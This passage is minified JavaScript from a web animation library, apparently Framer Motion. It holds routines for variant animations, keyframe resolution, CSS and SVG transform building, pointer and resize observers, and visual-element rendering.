Set(["width","height","top","left","right","bottom",...ir]),bu=e=>Array.isArray(e);function MT(e,t,n){e.hasValue(t)?e.getValue(t).set(n):e.addValue(t,yt(n))}function LT(e){return bu(e)?e[e.length-1]||0:e}function DT(e,t){const n=Yn(e,t);let{transitionEnd:s={},transition:r={},...i}=n||{};i={...i,...s};for(const o in i){const a=LT(i[o]);MT(e,o,a)}}const me=e=>!!(e&&e.getVelocity);function _T(e){return!!(me(e)&&e.add)}function xu(e,t){const n=e.getValue("willChange");if(_T(n))return n.add(t);if(!n&&Xt.WillChange){const s=new Xt.WillChange("auto");e.addValue("willChange",s),s.add(t)}}function ch(e){return e.replace(/([A-Z])/g,t=>`-${t.toLowerCase()}`)}const FT="framerAppearId",wv="data-"+ch(FT);function vv(e){return e.props[wv]}const BT=typeof window<"u";function VT({protectedKeys:e,needsAnimating:t},n){const s=e.hasOwnProperty(n)&&t[n]!==!0;return t[n]=!1,s}function bv(e,t,{delay:n=0,transitionOverride:s,type:r}={}){let{transition:i,transitionEnd:o,...a}=t;const l=e.getDefaultTransition();i=i?mv(i,l):l;const c=i==null?void 0:i.reduceMotion,u=i==null?void 0:i.skipAnimations;s&&(i=s);const d=[],h=r&&e.animationState&&e.animationState.getState()[r],m=i==null?void 0:i.path;m&&m.animateVisualElement(e,a,i,n,d);for(const f in a){const v=e.getValue(f,e.latestValues[f]??null),x=a[f];if(x===void 0||h&&VT(h,f))continue;const y={delay:n,...oh(i||{},f)};u&&(y.skipAnimations=!0);const g=v.get();if(g!==void 0&&!v.isAnimating()&&!Array.isArray(x)&&x===g&&!y.velocity){B.update(()=>v.set(x));continue}let b=!1;if(BT&&window.MotionHandoffAnimation){const E=vv(e);if(E){const S=window.MotionHandoffAnimation(E,f,B);S!==null&&(y.startTime=S,b=!0)}}xu(e,f);const k=c??e.shouldReduceMotion;v.start(ah(f,v,x,k&&yv.has(f)?{type:!1}:y,e,b));const C=v.animation;C&&d.push(C)}if(o){const f=()=>B.update(()=>{o&&DT(e,o)});d.length?Promise.all(d).then(f):f()}return d}function ku(e,t,n={}){var l;const s=Yn(e,t,n.type==="exit"?(l=e.presenceContext)==null?void 0:l.custom:void 0);let{transition:r=e.getDefaultTransition()||{}}=s||{};n.transitionOverride&&(r=n.transitionOverride);const i=s?()=>Promise.all(bv(e,s,n)):()=>Promise.resolve(),o=e.variantChildren&&e.variantChildren.size?(c=0)=>{const{delayChildren:u=0,staggerChildren:d,staggerDirection:h}=r;return WT(e,t,c,u,d,h,n)}:()=>Promise.resolve(),{when:a}=r;if(a){const[c,u]=a==="beforeChildren"?[i,o]:[o,i];return c().then(()=>u())}else return Promise.all([i(),o(n.delay)])}function WT(e,t,n=0,s=0,r=0,i=1,o){const a=[];for(const l of e.variantChildren)l.notify("AnimationStart",t),a.push(ku(l,t,{...o,delay:n+(typeof s=="function"?0:s)+fv(e.variantChildren,l,s,r,i)}).then(()=>l.notify("AnimationComplete",t)));return Promise.all(a)}function UT(e,t,n={}){e.notify("AnimationStart",t);let s;if(Array.isArray(t)){const r=t.map(i=>ku(e,i,n));s=Promise.all(r)}else if(typeof t=="string")s=ku(e,t,n);else{const r=typeof t=="function"?Yn(e,t,n.custom):t;s=Promise.all(bv(e,r,n))}return s.then(()=>{e.notify("AnimationComplete",t)})}const zT={test:e=>e==="auto",parse:e=>e},$T=e=>t=>t.test(e),HT=[rr,N,Mt,Bt,cS,lS,zT],gf=e=>HT.find($T(e));function QT(e){return typeof e=="number"?e===0:e!==null?e==="none"||e==="0"||Ud(e):!0}const GT=new Set(["auto","none","0"]);function KT(e,t,n){let s=0,r;for(;s<e.length&&!r;){const i=e[s];typeof i=="string"&&!GT.has(i)&&mS(i)&&(r=e[s]),s++}if(r&&n)for(const i of t)e[i]!==r&&(e[i]=nh(n,r))}class YT extends sh{constructor(t,n,s,r,i){super(t,n,s,r,i,!0)}readKeyframes(){const{unresolvedKeyframes:t,element:n,name:s}=this;if(!n||!n.current)return;super.readKeyframes();for(let u=0;u<t.length;u++){let d=t[u];if(typeof d=="string"&&(d=d.trim(),Qd(d))){const h=gv(d,n.current);h!==void 0&&(t[u]=h),u===t.length-1&&(this.finalKeyframe=d)}}if(this.resolveNoneKeyframes(),!yv.has(s)||t.length!==2)return;const[r,i]=t;if(typeof r=="number"&&typeof i=="number")return;const o=gf(r),a=gf(i),l=Jp(r),c=Jp(i);if(l!==c&&Gn[s]){this.needsMeasurement=!0;return}if(o!==a)if(cf(o)&&cf(a))for(let u=0;u<t.length;u++){const d=t[u];typeof d=="string"&&(t[u]=parseFloat(d))}else Gn[s]&&(this.needsMeasurement=!0)}resolveNoneKeyframes(){const{unresolvedKeyframes:t,name:n}=this,s=[];for(let r=0;r<t.length;r++)(t[r]===null||QT(t[r]))&&s.push(r);s.length&&KT(t,s,n)}measure(){const{element:t,name:n}=this;return Gn[n](window.getComputedStyle(t.current),()=>t.measureViewportBox())}measureInitialState(){var i;const{element:t,unresolvedKeyframes:n,name:s}=this;if(!t||!t.current)return;s==="height"&&(this.suspendedScrollY=window.pageYOffset),this.measuredOrigin=this.measure(),n[0]=this.measuredOrigin;const r=n[n.length-1];r!==void 0&&((i=this.motionValue)==null||i.jump(r,!1))}measureEndState(){var i,o;const{element:t,unresolvedKeyframes:n}=this;if(!t||!t.current)return;(i=this.motionValue)==null||i.jump(this.measuredOrigin,!1);const s=n.length-1,r=n[s];n[s]=this.measure(),r!==null&&this.finalKeyframe===void 0&&(this.finalKeyframe=r),(o=this.removedTransforms)!=null&&o.length&&this.removedTransforms.forEach(([a,l])=>{t.getValue(a).set(l)}),this.resolveNoneKeyframes()}}const uh=["borderTopLeftRadius","borderTopRightRadius","borderBottomRightRadius","borderBottomLeftRadius"];function Fr(e){return Pw(e)&&"offsetHeight"in e&&!("ownerSVGElement"in e)}function dh(e){return Pw(e)&&"ownerSVGElement"in e}const Su=(e,t)=>t&&typeof e=="number"?t.transform(e):e;function xv(e,t,n){if(e==null)return[];if(e instanceof EventTarget)return[e];if(typeof e=="string"){const r=document.querySelectorAll(e);return r?Array.from(r):[]}return Array.from(e).filter(s=>s!=null)}const XT={x:"translateX",y:"translateY",z:"translateZ",transformPerspective:"perspective"},JT=ir.length;function ZT(e,t,n){let s="",r=!0;for(let o=0;o<JT;o++){const a=ir[o],l=e[a];if(l===void 0)continue;let c=!0;if(typeof l=="number")c=l===(a.startsWith("scale")?1:0);else{const u=parseFloat(l);c=a.startsWith("scale")?u===1:u===0}if(!c||n){const u=Su(l,ga[a]);if(!c){r=!1;const d=XT[a]||a;s+=`${d}(${u}) `}n&&(t[a]=u)}}const i=e.pathRotation;return i&&(r=!1,s+=`rotate(${Su(i,ga.pathRotation)}) `),s=s.trim(),n?s=n(t,r?"":s):r&&(s="none"),s}function hh(e,t,n){const{style:s,vars:r,transformOrigin:i}=e;let o=!1,a=!1;for(const l in t){const c=t[l];if(or.has(l)){o=!0;continue}else if(Uw(l)){r[l]=c;continue}else{const u=Su(c,ga[l]);l.startsWith("origin")?(a=!0,i[l]=u):s[l]=u}}if(t.transform||(o||n?s.transform=ZT(t,e.transform,n):s.transform&&(s.transform="none")),a){const{originX:l="50%",originY:c="50%",originZ:u=0}=i;s.transformOrigin=`${l} ${c} ${u}`}}const eC={offset:"stroke-dashoffset",array:"stroke-dasharray"},tC={offset:"strokeDashoffset",array:"strokeDasharray"};function nC(e,t,n=1,s=0,r=!0){e.pathLength=1;const i=r?eC:tC;e[i.offset]=`${-s}`,e[i.array]=`${t} ${n}`}const kv=["transform","opacity","offsetDistance","offsetPath","offsetRotate","offsetAnchor"];function Sv(e,{attrX:t,attrY:n,attrScale:s,pathLength:r,pathSpacing:i=1,pathOffset:o=0,...a},l,c,u){if(hh(e,a,c),l){e.style.viewBox&&(e.attrs.viewBox=e.style.viewBox);return}e.attrs=e.style,e.style={};const{attrs:d,style:h}=e;for(const m of kv)d[m]!==void 0&&(h[m]=d[m],delete d[m]);(h.transform||d.transformOrigin)&&(h.transformOrigin=d.transformOrigin??"50% 50%",delete d.transformOrigin),h.transform&&(h.transformBox=(u==null?void 0:u.transformBox)??"fill-box",delete d.transformBox),t!==void 0&&(d.x=t),n!==void 0&&(d.y=n),s!==void 0&&(d.scale=s),r!==void 0&&nC(d,r,i,o,!1)}function Tv({top:e,left:t,right:n,bottom:s}){return{x:{min:t,max:n},y:{min:e,max:s}}}function sC({x:e,y:t}){return{top:t.min,right:e.max,bottom:t.max,left:e.min}}function rC(e,t){if(!t)return e;const n=t({x:e.left,y:e.top}),s=t({x:e.right,y:e.bottom});return{top:n.y,left:n.x,bottom:s.y,right:s.x}}function Ll(e){return e===void 0||e===1}function Tu({scale:e,scaleX:t,scaleY:n}){return!Ll(e)||!Ll(t)||!Ll(n)}function _n(e){return Tu(e)||Cv(e)||e.z||e.rotate||e.rotateX||e.rotateY||e.skewX||e.skewY}function Cv(e){return yf(e.x)||yf(e.y)}function yf(e){return e&&e!=="0%"}function ya(e,t,n){const s=e-n,r=t*s;return n+r}function wf(e,t,n,s,r){return r!==void 0&&(e=ya(e,r,s)),ya(e,n,s)+t}function Cu(e,t=0,n=1,s,r){e.min=wf(e.min,t,n,s,r),e.max=wf(e.max,t,n,s,r)}function Av(e,{x:t,y:n}){Cu(e.x,t.translate,t.scale,t.originPoint),Cu(e.y,n.translate,n.scale,n.originPoint)}const vf=.999999999999,bf=1.0000000000001;function iC(e,t,n,s=!1){var a;const r=n.length;if(!r)return;t.x=t.y=1;let i,o;for(let l=0;l<r;l++){i=n[l],o=i.projectionDelta;const{visualElement:c}=i.options;c&&c.props.style&&c.props.style.display==="contents"||(s&&i.options.layoutScroll&&i.scroll&&i!==i.root&&(Pt(e.x,-i.scroll.offset.x),Pt(e.y,-i.scroll.offset.y)),o&&(t.x*=o.x.scale,t.y*=o.y.scale,Av(e,o)),s&&_n(i.latestValues)&&Io(e,i.latestValues,(a=i.layout)==null?void 0:a.layoutBox))}t.x<bf&&t.x>vf&&(t.x=1),t.y<bf&&t.y>vf&&(t.y=1)}function Pt(e,t){e.min+=t,e.max+=t}function xf(e,t,n,s,r=.5){const i=H(e.min,e.max,r);Cu(e,t,n,i,s)}function kf(e,t){return typeof e=="string"?parseFloat(e)/100*(t.max-t.min):e}function Io(e,t,n){const s=n??e;xf(e.x,kf(t.x,s.x),t.scaleX,t.scale,t.originX),xf(e.y,kf(t.y,s.y),t.scaleY,t.scale,t.originY)}function Ev(e,t){return Tv(rC(e.getBoundingClientRect(),t))}function oC(e,t,n){const s=Ev(e,n),{scroll:r}=t;return r&&(Pt(s.x,r.offset.x),Pt(s.y,r.offset.y)),s}const{schedule:Js,cancel:Rv}=Vw(queueMicrotask,!1),pt={x:!1,y:!1};function Pv(){return pt.x||pt.y}function aC(e){return e==="x"||e==="y"?pt[e]?null:(pt[e]=!0,()=>{pt[e]=!1}):pt.x||pt.y?null:(pt.x=pt.y=!0,()=>{pt.x=pt.y=!1})}function qv(e,t){const n=xv(e),s=new AbortController,r={passive:!0,...t,signal:s.signal};return[n,r,()=>s.abort()]}function lC(e){return!(e.pointerType==="touch"||Pv())}function cC(e,t,n={}){const[s,r,i]=qv(e,n);return s.forEach(o=>{let a=!1,l=!1,c;const u=()=>{o.removeEventListener("pointerleave",f)},d=x=>{c&&(c(x),c=void 0),u()},h=x=>{a=!1,window.removeEventListener("pointerup",h),window.removeEventListener("pointercancel",h),l&&(l=!1,d(x))},m=()=>{a=!0,window.addEventListener("pointerup",h,r),window.addEventListener("pointercancel",h,r)},f=x=>{if(x.pointerType!=="touch"){if(a){l=!0;return}d(x)}},v=x=>{if(!lC(x))return;l=!1;const y=t(o,x);typeof y=="function"&&(c=y,o.addEventListener("pointerleave",f,r))};o.addEventListener("pointerenter",v,r),o.addEventListener("pointerdown",m,r)}),i}const Ov=(e,t)=>t?e===t?!0:Ov(e,t.parentElement):!1,ph=e=>e.pointerType==="mouse"?typeof e.button!="number"||e.button<=0:e.isPrimary!==!1,uC=new Set(["BUTTON","INPUT","SELECT","TEXTAREA","A"]);function dC(e){return uC.has(e.tagName)||e.isContentEditable===!0}const hC=new Set(["INPUT","SELECT","TEXTAREA"]);function pC(e){return hC.has(e.tagName)||e.isContentEditable===!0}const No=new WeakSet;function Sf(e){return t=>{t.key==="Enter"&&e(t)}}function Dl(e,t){e.dispatchEvent(new PointerEvent("pointer"+t,{isPrimary:!0,bubbles:!0}))}const fC=(e,t)=>{const n=e.currentTarget;if(!n)return;const s=Sf(()=>{if(No.has(n))return;Dl(n,"down");const r=Sf(()=>{Dl(n,"up")}),i=()=>Dl(n,"cancel");n.addEventListener("keyup",r,t),n.addEventListener("blur",i,t)});n.addEventListener("keydown",s,t),n.addEventListener("blur",()=>n.removeEventListener("keydown",s),t)};function Tf(e){return ph(e)&&!Pv()}const Cf=new WeakSet;function mC(e,t,n={}){const[s,r,i]=qv(e,n),o=a=>{const l=a.currentTarget;if(!Tf(a)||Cf.has(a))return;No.add(l),n.stopPropagation&&Cf.add(a);const c=t(l,a),u={...r,capture:!0},d=(f,v)=>{window.removeEventListener("pointerup",h,u),window.removeEventListener("pointercancel",m,u),No.has(l)&&No.delete(l),Tf(f)&&typeof c=="function"&&c(f,{success:v})},h=f=>{d(f,l===window||l===document||n.useGlobalTarget||Ov(l,f.target))},m=f=>{d(f,!1)};window.addEventListener("pointerup",h,u),window.addEventListener("pointercancel",m,u)};return s.forEach(a=>{(n.useGlobalTarget?window:a).addEventListener("pointerdown",o,r),Fr(a)&&(a.addEventListener("focus",c=>fC(c,r)),!dC(a)&&!a.hasAttribute("tabindex")&&(a.tabIndex=0))}),i}const jo=new WeakMap;let sn;const Iv=(e,t,n)=>(s,r)=>r&&r[0]?r[0][e+"Size"]:dh(s)&&"getBBox"in s?s.getBBox()[t]:s[n],gC=Iv("inline","width","offsetWidth"),yC=Iv("block","height","offsetHeight");function wC({target:e,borderBoxSize:t}){var n;(n=jo.get(e))==null||n.forEach(s=>{s(e,{get width(){return gC(e,t)},get height(){return yC(e,t)}})})}function vC(e){e.forEach(wC)}function bC(){typeof ResizeObserver>"u"||(sn=new ResizeObserver(vC))}function xC(e,t){sn||bC();const n=xv(e);return n.forEach(s=>{let r=jo.get(s);r||(r=new Set,jo.set(s,r)),r.add(t),sn==null||sn.observe(s)}),()=>{n.forEach(s=>{const r=jo.get(s);r==null||r.delete(t),r!=null&&r.size||sn==null||sn.unobserve(s)})}}const Mo=new Set;let Rs;function kC(){Rs=()=>{const e={get width(){return window.innerWidth},get height(){return window.innerHeight}};Mo.forEach(t=>t(e))},window.addEventListener("resize",Rs)}function SC(e){return Mo.add(e),Rs||kC(),()=>{Mo.delete(e),!Mo.size&&typeof Rs=="function"&&(window.removeEventListener("resize",Rs),Rs=void 0)}}function Au(e,t){return typeof e=="function"?SC(e):xC(e,t)}function Nv(e,t){let n;const s=()=>{const{currentTime:r}=t,o=(r===null?0:r.value)/100;n!==o&&e(o),n=o};return B.preUpdate(s,!0),()=>We(s)}function TC(e){return dh(e)&&e.tagName==="svg"}function CC(...e){const t=!Array.isArray(e[0]),n=t?0:-1,s=e[0+n],r=e[1+n],i=e[2+n],o=e[3+n],a=eh(r,i,o);return t?a(s):a}const Tr=new Set,Af=({timestamp:e})=>{Tr.forEach(t=>t.tick(e))};class AC extends Ka{constructor(t){super(),this.state="idle",this.startTime=0,this.currentTime=0,this.started=!1,this.hasNextTarget=!1,this.nextTarget=0,this.stop=()=>{var s,r;this.state!=="idle"&&(this.teardown(),(r=(s=this.options).onStop)==null||r.call(s))},this.options=t,th(t),this.factory=t.type||Bs,this.generator=this.factory(t);const{driver:n}=t;n&&(this.driver=n(s=>this.tick(s))),this.startTime=this.now(),this.state="running",this.driver?this.driver.start():(Tr.size||B.update(Af,!0),Tr.add(this))}setTarget(t,n){this.nextTarget=t,this.nextVelocity=n,this.hasNextTarget=!0}retarget(t,n){const{options:s,generator:r}=this;s.keyframes=t,s.velocity=n,this.startTime=this.now(),this.currentTime=0,r.retarget?r.retarget(t,n):this.generator=this.factory(s)}tick(t){var d;const{options:n,hasNextTarget:s}=this,{delay:r=0,onUpdate:i,onPlay:o}=n,a=Math.round(t-this.startTime)-r,l=this.currentTime=Math.max(0,a),c=this.generator.next(l),u=a<0?n.keyframes[0]:c.value;if(s){this.hasNextTarget=!1;const{keyframes:h}=n;h[0]=u,h[1]=this.nextTarget,this.retarget(h,this.nextVelocity??this.getGeneratorVelocity())}(s||!this.started)&&(this.started=!0,o==null||o()),this.state==="running"&&(i==null||i(u),c.done&&a>=0&&!s&&!this.hasNextTarget&&this.state==="running"&&(this.notifyFinished(),this.teardown(),this.state="finished",(d=n.onComplete)==null||d.call(n)))}getGeneratorVelocity(){return tv(this.generator,this.currentTime,this.options.velocity)}now(){return this.driver?this.driver.now():be.now()}teardown(){this.state="idle",this.driver?this.driver.stop():(Tr.delete(this),Tr.size||We(Af))}}function EC(e,t,n={}){const s=e.get();let r=null,i;const o=typeof s=="string"?s.replace(/[\d.-]/g,""):void 0,a=u=>i(o?u+o:u),l=()=>{var u;return(u=e.events.animationStart)==null?void 0:u.notify()},c=()=>{r&&(r.stop(),r=null),e.animation=void 0};if(e.attach((u,d)=>{i=d;const h=Rf(u);if((r==null?void 0:r.state)==="running"){r.setTarget(h,n.velocity);return}const m=Rf(e.get()),f=r?r.getGeneratorVelocity():e.getVelocity();if(c(),m===h)return;const v={keyframes:[m,h],velocity:f,type:"spring",restDelta:.001,restSpeed:.01,...n,onUpdate:a},x=r=new AC({...v,onPlay:l});e.animation=x,x.then(()=>{var y;r===x&&(r=null,e.animation=void 0,(y=e.events.animationComplete)==null||y.notify())})},c),me(t)){let u=n.skipInitialAnimation===!0;const d=t.on("change",m=>{u?(u=!1,e.jump(Ef(m,o),!1)):e.set(Ef(m,o))}),h=e.on("destroy",d);return()=>{d(),h()}}return c}function Ef(e,t){return t?e+t:e}function Rf(e){return typeof e=="number"?e:parseFloat(e)}const Pf=()=>({translate:0,scale:1,origin:0,originPoint:0}),Ps=()=>({x:Pf(),y:Pf()}),qf=()=>({min:0,max:0}),de=()=>({x:qf(),y:qf()}),RC=new WeakMap;function Ya(e){return e!==null&&typeof e=="object"&&typeof e.start=="function"}function hi(e){return typeof e=="string"||Array.isArray(e)}const fh=["animate","whileInView","whileFocus","whileHover","whileTap","whileDrag","exit"],wa=["initial",...fh];function Xa(e){if(Ya(e.animate))return!0;for(let t=0;t<wa.length;t++)if(hi(e[wa[t]]))return!0;return!1}function jv(e){return!!(Xa(e)||e.variants)}function PC(e,t,n){for(const s in t){const r=t[s],i=n[s];if(me(r))e.addValue(s,r);else if(me(i))e.addValue(s,yt(r,{owner:e}));else if(i!==r)if(e.hasValue(s)){const o=e.getValue(s);o.liveStyle===!0?o.jump(r):o.hasAnimated||o.set(r)}else{const o=e.getStaticValue(s);e.addValue(s,yt(o!==void 0?o:r,{owner:e}))}}for(const s in n)t[s]===void 0&&e.removeValue(s);return t}const va={current:null},mh={current:!1},qC=typeof window<"u";function Mv(){if(mh.current=!0,!!qC)if(window.matchMedia){const e=window.matchMedia("(prefers-reduced-motion)"),t=()=>va.current=e.matches;e.addEventListener("change",t),t()}else va.current=!1}const Of=["AnimationStart","AnimationComplete","Update","BeforeLayoutMeasure","LayoutMeasure","LayoutAnimationStart","LayoutAnimationComplete"];let ba={};function Lv(e){ba=e}function OC(){return ba}class IC{scrapeMotionValuesFromProps(t,n,s){return{}}constructor({parent:t,props:n,presenceContext:s,reducedMotionConfig:r,skipAnimations:i,blockInitialAnimation:o,visualState:a},l={}){this.current=null,this.children=new Set,this.isVariantNode=!1,this.isControllingVariants=!1,this.shouldReduceMotion=null,this.shouldSkipAnimations=!1,this.values=new Map,this.KeyframeResolver=sh,this.features={},this.valueSubscriptions=new Map,this.prevMotionValues={},this.hasBeenMounted=!1,this.events={},this.propEventSubscriptions={},this.notifyUpdate=()=>this.notify("Update",this.latestValues),this.render=()=>{this.current&&(this.triggerBuild(),this.renderInstance(this.current,this.renderState,this.props.style,this.projection))},this.renderScheduledAt=0,this.scheduleRender=()=>{const m=be.now();this.renderScheduledAt<m&&(this.renderScheduledAt=m,B.render(this.render,!1,!0))};const{latestValues:c,renderState:u}=a;this.latestValues=c,this.baseTarget={...c},this.initialValues=n.initial?{...c}:{},this.renderState=u,this.parent=t,this.props=n,this.presenceContext=s,this.depth=t?t.depth+1:0,this.reducedMotionConfig=r,this.skipAnimationsConfig=i,this.options=l,this.blockInitialAnimation=!!o,this.isControllingVariants=Xa(n),this.isVariantNode=jv(n),this.isVariantNode&&(this.variantChildren=new Set),this.manuallyAnimateOnMount=!!(t&&t.current);const{willChange:d,...h}=this.scrapeMotionValuesFromProps(n,{},this);for(const m in h){const f=h[m];c[m]!==void 0&&me(f)&&f.set(c[m])}}mount(t){var n,s;if(this.hasBeenMounted)for(const r in this.initialValues)(n=this.values.get(r))==null||n.jump(this.initialValues[r]),this.latestValues[r]=this.initialValues[r];this.current=t,RC.set(t,this),this.projection&&!this.projection.instance&&this.projection.mount(t),this.parent&&this.isVariantNode&&!this.isControllingVariants&&(this.removeFromVariantTree=this.parent.addVariantChild(this)),this.values.forEach((r,i)=>this.bindToMotionValue(i,r)),this.reducedMotionConfig==="never"?this.shouldReduceMotion=!1:this.reducedMotionConfig==="always"?this.shouldReduceMotion=!0:(mh.current||Mv(),this.shouldReduceMotion=va.current),this.shouldSkipAnimations=this.skipAnimationsConfig??!1,(s=this.parent)==null||s.addChild(this),this.update(this.props,this.presenceContext),this.hasBeenMounted=!0}unmount(){var t;this.projection&&this.projection.unmount(),We(this.notifyUpdate),We(this.render),this.valueSubscriptions.forEach(n=>n()),this.valueSubscriptions.clear(),this.removeFromVariantTree&&this.removeFromVariantTree(),(t=this.parent)==null||t.removeChild(this);for(const n in this.events)this.events[n].clear();for(const n in this.features){const s=this.features[n];s&&(s.unmount(),s.isMounted=!1)}this.current=null}addChild(t){this.children.add(t),this.enteringChildren??(this.enteringChildren=new Set),this.enteringChildren.add(t)}removeChild(t){this.children.delete(t),this.enteringChildren&&this.enteringChildren.delete(t)}bindToMotionValue(t,n){if(this.valueSubscriptions.has(t)&&this.valueSubscriptions.get(t)(),n.accelerate&&vu.has(t)&&this.current instanceof HTMLElement){const{factory:o,keyframes:a,times:l,ease:c,duration:u}=n.accelerate,d=new hv({element:this.current,name:t,keyframes:a,times:l,ease:c,duration:at(u)}),h=o(d);this.valueSubscriptions.set(t,()=>{h(),d.cancel()});return}const s=or.has(t);s&&this.onBindTransform&&this.onBindTransform();const r=n.on("change",o=>{this.latestValues[t]=o,this.props.onUpdate&&B.preRender(this.notifyUpdate),s&&this.projection&&(this.projection.isTransformDirty=!0),this.scheduleRender()});let i;typeof window<"u"&&window.MotionCheckAppearSync&&(i=window.MotionCheckAppearSync(this,t,n)),this.valueSubscriptions.set(t,()=>{r(),i&&i()})}sortNodePosition(t){return!this.current||!this.sortInstanceNodePosition||this.type!==t.type?0:this.sortInstanceNodePosition(this.current,t.current)}updateFeatures(){let t="animation";for(t in ba){const n=ba[t];if(!n)continue;const{isEnabled:s,Feature:r}=n;if(!this.features[t]&&r&&s(this.props)&&(this.features[t]=new r(this)),this.features[t]){const i=this.features[t];i.isMounted?i.update():(i.mount(),i.isMounted=!0)}}}triggerBuild(){this.build(this.renderState,this.latestValues,this.props)}measureViewportBox(){return this.current?this.measureInstanceViewportBox(this.current,this.props):de()}getStaticValue(t){return this.latestValues[t]}setStaticValue(t,n){this.latestValues[t]=n}update(t,n){(t.transformTemplate||this.props.transformTemplate)&&this.scheduleRender(),this.prevProps=this.props,this.props=t,this.prevPresenceContext=this.presenceContext,this.presenceContext=n;for(let s=0;s<Of.length;s++){const r=Of[s];this.propEventSubscriptions[r]&&(this.propEventSubscriptions[r](),delete this.propEventSubscriptions[r]);const i="on"+r,o=t[i];o&&(this.propEventSubscriptions[r]=this.on(r,o))}this.prevMotionValues=PC(this,this.scrapeMotionValuesFromProps(t,this.prevProps||{},this),this.prevMotionValues),this.handleChildMotionValue&&this.handleChildMotionValue()}getProps(){return this.props}getVariant(t){return this.props.variants?this.props.variants[t]:void 0}getDefaultTransition(){return this.props.transition}getTransformPagePoint(){return this.props.transformPagePoint}getClosestVariantNode(){return this.isVariantNode?this:this.parent?this.parent.getClosestVariantNode():void 0}addVariantChild(t){const n=this.getClosestVariantNode();if(n)return n.variantChildren&&n.variantChildren.add(t),()=>n.variantChildren.delete(t)}addValue(t,n){const s=this.values.get(t);n!==s&&(s&&this.removeValue(t),this.bindToMotionValue(t,n),this.values.set(t,n),this.latestValues[t]=n.get())}removeValue(t){this.values.delete(t);const n=this.valueSubscriptions.get(t);n&&(n(),this.valueSubscriptions.delete(t)),delete this.latestValues[t],this.removeValueFromRenderState(t,this.renderState)}hasValue(t){return this.values.has(t)}getValue(t,n){if(this.props.values&&this.props.values[t])return this.props.values[t];let s=this.values.get(t);return s===void 0&&n!==void 0&&(s=yt(n===null?void 0:n,{owner:this}),this.addValue(t,s)),s}readValue(t,n){let s=this.latestValues[t]!==void 0||!this.current?this.latestValues[t]:this.getBaseTargetFromProps(this.props,t)??this.readValueFromInstance(this.current,t,this.options);return s!=null&&(typeof s=="string"&&(Wd(s)||Ud(s))?s=parseFloat(s):typeof s!="number"&&!Xe.test(s)&&Xe.test(n)&&(s=nh(t,n)),this.setBaseTarget(t,me(s)?s.get():s)),me(s)?s.get():s}setBaseTarget(t,n){this.baseTarget[t]=n}getBaseTarget(t){var i;const{initial:n}=this.props;let s;if(typeof n=="string"||typeof n=="object"){const o=lh(this.props,n,(i=this.presenceContext)==null?void 0:i.custom);o&&(s=o[t])}if(n&&s!==void 0)return s;const r=this.getBaseTargetFromProps(this.props,t);return r!==void 0&&!me(r)?r:this.initialValues[t]!==void 0&&s===void 0?void 0:this.baseTarget[t]}on(t,n){return this.events[t]||(this.events[t]=new da),this.events[t].add(n)}notify(t,...n){this.events[t]&&this.events[t].notify(...n)}scheduleRenderMicrotask(){Js.render(this.render)}}class Dv extends IC{constructor(){super(...arguments),this.KeyframeResolver=YT}sortInstanceNodePosition(t,n){return t.compareDocumentPosition(n)&2?1:-1}getBaseTargetFromProps(t,n){const s=t.style;return s?s[n]:void 0}removeValueFromRenderState(t,{vars:n,style:s}){delete n[t],delete s[t]}handleChildMotionValue(){this.childSubscription&&(this.childSubscription(),delete this.childSubscription);const{children:t}=this.props;me(t)&&(this.childSubscription=t.on("change",n=>{this.current&&(this.current.textContent=`${n}`)}))}}class On{constructor(t){this.isMounted=!1,this.node=t}update(){}}function _v(e,{style:t,vars:n},s,r){const i=e.style;let o;for(o in t)i[o]=t[o];r==null||r.applyProjectionStyles(i,s);for(o in n)i.setProperty(o,n[o])}function If(e,t){return t.max===t.min?0:e/(t.max-t.min)*100}const yr={correct:(e,t)=>{if(!t.target)return e;if(typeof e=="string")if(N.test(e))e=parseFloat(e);else return e;const n=If(e,t.target.x),s=If(e,t.target.y);return`${n}% ${s}%`}},NC={correct:(e,{treeScale:t,projectionDelta:n})=>{const s=e,r=Xe.parse(e);if(r.length>5)return s;const i=Xe.createTransformer(e),o=typeof r[0]!="number"?1:0,a=n.x.scale*t.x,l=n.y.scale*t.y;r[0+o]/=a,r[1+o]/=l;const c=H(a,l,.5);return typeof r[2+o]=="number"&&(r[2+o]/=c),typeof r[3+o]=="number"&&(r[3+o]/=c),i(r)}},Eu={borderRadius:{...yr,applyTo:[...uh]},borderTopLeftRadius:yr,borderTopRightRadius:yr,borderBottomLeftRadius:yr,borderBottomRightRadius:yr,boxShadow:NC};function Fv(e,{layout:t,layoutId:n}){return or.has(e)||e.startsWith("origin")||(t||n!==void 0)&&(!!Eu[e]||e==="opacity")}function gh(e,t,n){var o;const s=e.style,r=t==null?void 0:t.style,i={};if(!s)return i;for(const a in s)(me(s[a])||r&&me(r[a])||Fv(a,e)||((o=n==null?void 0:n.getValue(a))==null?void 0:o.liveStyle)!==void 0)&&(i[a]=s[a]);return i}function jC(e){return window.getComputedStyle(e)}class MC extends Dv{constructor(){super(...arguments),this.type="html",this.renderInstance=_v}mount(t){Qa(!!t.style),super.mount(t)}readValueFromInstance(t,n){var s;if(or.has(n))return(s=this.projection)!=null&&s.isProjecting?pu(n):tT(t,n);{const r=jC(t),i=(Uw(n)?r.getPropertyValue(n):r[n])||0;return typeof i=="string"?i.trim():i}}measureInstanceViewportBox(t,{transformPagePoint:n}){return Ev(t,n)}build(t,n,s){hh(t,n,s.transformTemplate)}scrapeMotionValuesFromProps(t,n,s){return gh(t,n,s)}}const Bv=new Set(["baseFrequency","diffuseConstant","kernelMatrix","kernelUnitLength","keySplines","keyTimes","limitingConeAngle","markerHeight","markerWidth","numOctaves","targetX","targetY","surfaceScale","specularConstant","specularExponent","stdDeviation","tableValues","viewBox","gradientTransform","pathLength","startOffset","textLength","lengthAdjust"]),Vv=e=>typeof e=="string"&&e.toLowerCase()==="svg";function LC(e,t,n,s){_v(e,t,void 0,s);for(const r in t.attrs)e.setAttribute(Bv.has(r)?r:ch(r),t.attrs[r])}function Wv(e,t,n){const s=gh(e,t,n);for(const r in e)if(me(e[r])||me(t[r])){const i=ir.indexOf(r)!==-1?"attr"+r.charAt(0).toUpperCase()+r.substring(1):r;s[i]=e[r]}return s}class DC extends Dv{constructor(){super(...arguments),this.type="svg",this.isSVGTag=!1,this.measureInstanceViewportBox=de}getBaseTargetFromProps(t,n){return t[n]}readValueFromInstance(t,n){if(or.has(n)){const s=rv(n);return s&&s.default||0}if(kv.includes(n)){const r=getComputedStyle(t)[n];if(typeof r=="string"&&r)return r.trim()}return n=Bv.has(n)?n:ch(n),t.getAttribute(n)}scrapeMotionValuesFromProps(t,n,s){return 